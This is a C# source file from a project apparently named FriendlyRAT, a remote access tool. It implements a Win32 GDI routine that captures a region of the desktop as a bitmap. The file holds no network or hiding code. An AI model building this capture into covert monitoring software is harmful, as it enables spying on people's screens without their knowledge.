using System;
using System.Collections.Generic;
using System.Text;
using static FriendlyRAT.Core.Windows.Native;

namespace FriendlyRAT.Core.Windows
{
    using System.ComponentModel;
    using System.Drawing;

    internal static class RegionCapture
    {
        public static Bitmap Capture(Rectangle region)
        {
            var desktopHwnd = Native.GetDesktopWindow();
            var desktopDc = GetWindowDC(desktopHwnd);
            var memoryDc = CreateCompatibleDC(desktopDc);
            var bitmap = CreateCompatibleBitmap(desktopDc, region.Width, region.Height);
            var oldBitmap = SelectObject(memoryDc, bitmap);

            var success = BitBlt(memoryDc, 0, 0, region.Width, region.Height, desktopDc, region.Left, region.Top, Native.SRCCOPY | Native.CAPTUREBLT);

            try
            {
                if (!success)
                {
                    throw new Win32Exception();
                }

                return Image.FromHbitmap(bitmap);
            }
            finally
            {
                SelectObject(memoryDc, oldBitmap);
                DeleteObject(bitmap);
                DeleteDC(memoryDc);
                ReleaseDC(desktopHwnd, desktopDc);
            }
        }
    }
}
